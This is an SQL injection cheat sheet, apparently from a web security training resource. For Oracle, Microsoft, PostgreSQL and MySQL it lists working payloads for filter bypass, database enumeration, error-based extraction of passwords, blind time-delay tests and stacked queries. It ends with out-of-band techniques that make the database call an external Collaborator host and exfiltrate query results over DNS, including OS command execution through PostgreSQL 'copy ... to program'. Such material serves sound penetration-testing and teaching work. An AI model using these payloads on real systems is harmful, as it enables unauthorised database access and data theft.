# SQL injection cheat sheet

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

## String concatenation

You can concatenate together multiple strings to make a single string.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><pre><code>'foo'||'bar'</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>'foo'+'bar'</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>'foo'||'bar'</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>'foo' 'bar'</code></pre><br><i>[Note the space between the two strings]</i><pre><code>CONCAT('foo','bar')</code></pre></td>
  </tr>
</table>

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string <code>ba</code>.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><pre><code>SUBSTR('foobar', 4, 2)</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>SUBSTRING('foobar', 4, 2)</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>SUBSTRING('foobar', 4, 2)</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>SUBSTRING('foobar', 4, 2)</code></pre></td>
  </tr>
</table>

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><pre><code>--comment</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>--comment</code></pre><pre><code>/*comment*/</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>--comment</code></pre><pre><code>/*comment*/</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>#comment</code></pre><pre><code>-- comment</code></pre><br><i>[Note the space after the double dash]</i><pre><code>/*comment*/</code></pre></td>
  </tr>
</table>

## Bypassing filters

If an application blocks specific keywords or characters, you may still be able to inject SQL using the following techniques. Encoding-based bypasses, such as URL-encoding keywords or using <code>CHAR()</code> to construct strings, are covered separately in Obfuscating attacks using encodings.

SQL keywords are not case-sensitive, so you can vary the case of your input to bypass a filter that blocks a specific keyword. For example, if <code>SELECT</code> is blocked, try <code>SeLeCT</code>.

You can also use inline comments in place of whitespace, so that a filter looking for a keyword surrounded by spaces does not match. For example, <code>SELECT/**/username/**/FROM/**/users</code>.

On MySQL, you can use versioned comments to hide a keyword from a filter while still having the database execute it. The database runs the contents of a <code>/*! ... */</code> comment, so <code>/*!SELECT*/</code> is treated as <code>SELECT</code>.

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><pre><code>SELECT banner FROM v$version</code></pre><pre><code>SELECT version FROM v$instance</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>SELECT @@version</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>SELECT version()</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>SELECT @@version</code></pre></td>
  </tr>
</table>

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><pre><code>SELECT * FROM all_tables</code></pre><pre><code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>SELECT * FROM information_schema.tables</code></pre><pre><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>SELECT * FROM information_schema.tables</code></pre><pre><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>SELECT * FROM information_schema.tables</code></pre><pre><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></pre></td>
  </tr>
</table>

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><pre><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></pre></td>
  </tr>
</table>

## Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

<table>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code></pre><br><code>> Conversion failed when converting the varchar value 'secret' to data type int.</code></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code></pre><br><code>> invalid input syntax for integer: "secret"</code></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code></pre><br><code>> XPATH syntax error: '\secret'</code></td>
  </tr>
</table>

## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><i>Does not support batched queries.</i></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>QUERY-1-HERE; QUERY-2-HERE</code></pre><pre><code>QUERY-1-HERE QUERY-2-HERE</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>QUERY-1-HERE; QUERY-2-HERE</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>QUERY-1-HERE; QUERY-2-HERE</code></pre></td>
  </tr>
</table>

> **Note**
> 
> With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><pre><code>dbms_pipe.receive_message(('a'),10)</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>WAITFOR DELAY '0:0:10'</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>SELECT pg_sleep(10)</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>SELECT SLEEP(10)</code></pre></td>
  </tr>
</table>

## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><pre><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td><pre><code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</code></pre></td>
  </tr>
</table>

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td>(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br><pre><code>SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual</code></pre><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br><pre><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td>The following techniques work on Windows only:<br><pre><code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code></pre><pre><code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></pre></td>
  </tr>
</table>

## DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

<table>
  <tr>
    <td><b>Oracle</b></td>
    <td><pre><code>SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual</code></pre></td>
  </tr>
  <tr>
    <td><b>Microsoft</b></td>
    <td><pre><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')</code></pre></td>
  </tr>
  <tr>
    <td><b>PostgreSQL</b></td>
    <td><pre><code>create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();</code></pre></td>
  </tr>
  <tr>
    <td><b>MySQL</b></td>
    <td>The following technique works on Windows only:<br><pre><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></pre></td>
  </tr>
</table>
